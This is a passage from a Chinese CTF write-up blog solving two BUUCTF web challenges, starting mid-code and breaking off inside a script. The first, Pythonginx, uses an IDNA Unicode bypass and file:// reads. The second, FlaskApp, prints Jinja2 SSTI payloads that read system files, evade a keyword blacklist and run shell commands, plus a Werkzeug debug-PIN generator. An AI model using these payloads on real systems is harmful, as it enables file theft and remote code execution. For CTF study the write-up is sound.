class="hljs-comment">#urlsplit(url)函数会将URL字符串解析为多个部分，包括协议、主机名、路径、查询参数等，并返回一个namedtuple对象。然后通过list()函数将namedtuple对象转换为列表，存储在名为&quot;parts&quot;的变量中</span><br>    host = parts[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 222 &quot;</span> + host<br>    <br>    newhost = []<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-comment"># 注意这个</span><br>    <br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost) <span class="hljs-comment">#将列表newhost中的元素使用&#x27;.&#x27;连接成一个字符串</span><br>    finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment"># 经过urlunsplit函数处理后的parts重新拼接成一个URL，并且使用空格将其分割成一个字符串列表，然后取列表中的第一个元素赋值给finalUrl变量</span><br>    host = urlparse(finalUrl).hostname<br>    <br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="hljs-comment"># 打开finalUrl对应的URL，然后使用read()方法来读取该URL的内容。最后，使用return语句将读取的内容返回。</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;我扌 your problem? 333&quot;</span><br><br></code></pre></td></tr></table></figure><p><code>URL</code>的一般格式：</p><p><code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p><p>常见的协议有<code>http</code>,<code>https</code>,<code>ftp</code>以及<code>file</code>。其中FIle协议也叫<strong>本地文件传输协议</strong> ，主要用于访问本地计算机中的文件。格式：<strong>file:&#x2F;&#x2F;&#x2F;文件路径</strong>。比如：<code>file:///D:/mywebproject/bigwatermelon/index.html</code></p><p>可以看到<code>url</code>经过处理后进行了三次<code>if</code>条件的判断，前两次判断<code> if host == &#39;suctf.cc&#39;</code>，如果返回<code>true</code>就直接  <code> return    xxxxx</code>,如果第三次<code>if  host == &#39;suctf.cc&#39;</code> ，这时会返回指定<code>url</code>的内容。</p><p>这么看似乎是矛盾的，不过第三次判断前进行了<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>处理。解题思路就是寻找一个特定的<code>URL</code>,他经过前两次解析后<code>host != scctf.cc</code>但经过编码后满足<code>host == suctf.cc</code></p><p> <code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code> 进行了规范化, 会把某些特殊的 Unicode 字符规范化为正常的 ASCII 字符。那我们需要找到一些 unicode 字符绕过前两个 if 的检测, 并且在进行规范化之后通过第三个 if 的判断。</p><p><code>IDNA编码通常用于将域名中的非ASCII字符转换为ASCII兼容格式</code></p><p>然后就是找某个<code>unicode</code>让他规范化之前<code>不正常</code>但是规范化后<code>正常</code>。这里参考了<code>mochu</code>师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">chars = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chars:<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7f</span>, <span class="hljs-number">0x10FFFF</span>):<br><span class="hljs-keyword">try</span>:<br>char_i = <span class="hljs-built_in">chr</span>(i).encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">if</span> char_i == c:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ASCII: &#123;&#125;   Unicode: &#123;&#125;    Number: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c, <span class="hljs-built_in">chr</span>(i), i))<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br><br>        <span class="hljs-comment">#https://blog.csdn.net/mochu7777777/article/details/127140963</span><br>        <span class="hljs-comment">#在结果中随便选一个替换就好</span><br></code></pre></td></tr></table></figure><p><img src="/img/nignx.png" alt="nignx"></p>   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#nginx中一些重要文件的位置</span><br><br>    配置文件存放目录：<span class="hljs-regexp">/etc/</span>nginx<br>    主配置文件：<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>    管理脚本：<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>    模块：<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>    应用程序：<span class="hljs-regexp">/usr/</span>sbin/nginx<br>    程序默认存放位置：<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>    日志默认存放位置：<span class="hljs-regexp">/var/</span>log/nginx<br>    配置文件目录为：<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure><p>因为看了其它师傅的<code>wp</code>就直接去访问了<code>file://ſuctf.cc/usr/local/nginx/conf/nginx.conf</code>（注意suctf.cc是主机名）</p><p><img src="/img/nignx2.png" alt="nignx2"></p><p>最后把<code>url=file://ſuctf.cc/usr/fffffflag</code>放进去就行</p><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6070</span><br>https:<span class="hljs-regexp">//</span>exp10it.cn<span class="hljs-regexp">/2022/</span><span class="hljs-number">08</span><span class="hljs-regexp">/buuctf-web-writeup-4/</span><span class="hljs-comment">#suctf-2019pythonginx</span><br>https:<span class="hljs-regexp">//m</span>ayi077.gitee.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/05/</span>SUCTF-<span class="hljs-number">2019</span>-Pythonginx/<br>有关file协议的文章：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>参考<code>https://xz.aliyun.com/t/8092</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                   </p><p><img src="/img/flask1.png" alt="flask1"></p><p>提示：</p><p><img src="/img/flask2.png" alt="flask2"></p><p><code>&lt;!-- PIN ---&gt;</code></p><p><code>Flask</code>框架，实现<code>base64</code>的加密解密功能，分别在加密解密界面输入<code>$&#123;7*7&#125;</code>：</p><p><img src="/img/flask3.png" alt="flask3"></p><p>开启了<code>debug</code>模式，存在部分和<code>decode</code>有关的源码：</p><p><img src="/img/flask4.png" alt="flask4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) : <span class="hljs-comment">#检查当前的HTTP请求中是否包含了名为&#x27;text&#x27;的参数</span><br><br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br><br>        text_decode = base64.b64decode(text.encode()) <span class="hljs-comment">#猜测这个encode就是利用base64加密</span><br><br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br><br>        <span class="hljs-keyword">if</span> waf(tmp) :<br><br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br><br>        res =  render_template_string(tmp) <span class="hljs-comment">#使用模板引擎渲染tmp</span><br></code></pre></td></tr></table></figure><p>可以看到<code>tmp</code>经过<code>waf</code>后就送给模板引擎渲染了，但<code>waf</code>具体是怎么个事我们不知道。可以试试把<code>$&#123;7*7&#125;</code>加密后再放到<code>decode</code>页面解密。</p><p><img src="/img/flask5.png" alt="flask5"></p><p>触发了<code>waf</code>，后面尝试了<code>&#123;&#123;1+1&#125;&#125;</code>，加密再解密回显了<code>2</code>，确实存在<code>SSTI</code>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考了一些有关SSIT的文章：<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">11090</span><span class="hljs-comment">#toc-2</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Article-kelp/</span>p/<span class="hljs-number">14797393</span>.html<br></code></pre></td></tr></table></figure><p>利用文章中给的<code>payload</code>读源码：</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&#123;config&#125;&#125;</code>可以访问，直接<code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('app.py').read()&#125;&#125;</code>也行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64加密&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm1</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64解密&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;提交&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>)\:<br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>, <span class="hljs-string">&quot;commands&quot;</span>, <span class="hljs-string">&quot;socket&quot;</span>, <span class="hljs-string">&quot;hex&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list\:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower()\:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>()\:<br>    txt = <span class="hljs-string">&quot;失败乃成功之母！！&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>, txt=txt)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 \:&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res = render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;加密&quot;</span>, img=<span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp)\:<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res = render_template_string(tmp)<br>        flash(res)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;解密&quot;</span>, img=<span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">name</span>)\:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>\:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>可以看到过滤了<code>os</code>,<code>eval</code>,<code>popen</code>。使用字符串拼接绕过就行：</p><p><code>&#123;&#123;config.__class__.__init__.__globals__['o'+'s'].listdir('/')&#125;&#125;</code></p><p><img src="/img/flaskapp1.png" alt="flaskapp1"></p><p><code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()&#125;&#125;</code></p><p>其实<code>.方法</code>完全可以通过<code>[]</code>替换，所以<code>payload</code>也能换成：</p><p><code> &#123;&#123;config['__class__']['__init__']['__glo'+'bals__']['__builtins__']['e'+'val']("__im"+"port__('o'+'s').po"+"pen('cat /this_is_the_fl'+'ag.txt').read()")&#125;&#125;</code></p><p>第二种方法就是用他提示的<code>PIN</code>去解题(<code>https://xz.aliyun.com/t/8092</code>)：</p><p><code>Flask 如果在生产环境中开启 debug 模式，就会产生一个交互的 shell ,可以执行自定义的 python 代码。在较旧版本中是不用输入 PIN 码就可以执行代码，在新版本中需要输入一个 PIN 码。</code></p><p>如果要构造<code>PIN</code>码，我们需要知道下面这些信息：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><span class="hljs-number">1</span>.username可以从 <span class="hljs-regexp">/etc/</span>passwd 中读取。<br><span class="hljs-number">2</span>.modname 一般默认flask.app<br><span class="hljs-number">3</span>.getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))一般默认为 Flask<br><span class="hljs-number">4</span>.flask下app.py的绝对路径。通过报错信息得到。<br><span class="hljs-number">5</span>.str(uuid.getnode()) MAC地址 读取这两个地址：<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/address 或者 /</span>sys<span class="hljs-regexp">/class/</span>net<span class="hljs-regexp">/ens33/</span>address<br><span class="hljs-number">6</span>.最后一个就是机器的id。 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<span class="hljs-regexp">/etc/m</span>achine-id或<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取<span class="hljs-regexp">/proc/</span>self/cgroup<br><br><br>#参考：https:<span class="hljs-comment">//xz.aliyun.com/t/8092#toc-2</span><br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#因为我们知道要读的文件是什么，直接用open就行<br><span class="hljs-number">1</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br>#有很多，一般要么是root要么是最底下的flaskweb，试一下就行<br><span class="hljs-number">2</span>.flask.app<br><span class="hljs-number">3</span>.Flask<br><span class="hljs-number">4</span>.<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br><span class="hljs-number">5</span>. <span class="hljs-number">3</span>a:<span class="hljs-number">0</span>d:<span class="hljs-number">25</span>:ad:<span class="hljs-number">23</span>:<span class="hljs-number">12</span> #读<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address就行，然后<span class="hljs-keyword">int</span>(<span class="hljs-string">&quot;3a0d25ad2312&quot;</span>,<span class="hljs-number">16</span>)转换成<span class="hljs-number">10</span>进制：<span class="hljs-number">63828141089554</span><br><span class="hljs-number">6</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/machine-id&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br># <span class="hljs-number">1408</span>f836b0ca514d796cbf8960e45fa1<br>这里我直接读了<span class="hljs-regexp">/etc/m</span>achine-id<br><br>网上看其它师傅去读的<span class="hljs-regexp">/proc/</span>self/cgroup(然后找docker后的字符串,这两个看着并不一样)<br>#d533bb8a3f0cd200ddb525a2ef04de18328f8cf780d71db3867a389664e27712<br><br></code></pre></td></tr></table></figure><p>利用文章中的方法生成<code>pin</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;179143515503864&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span 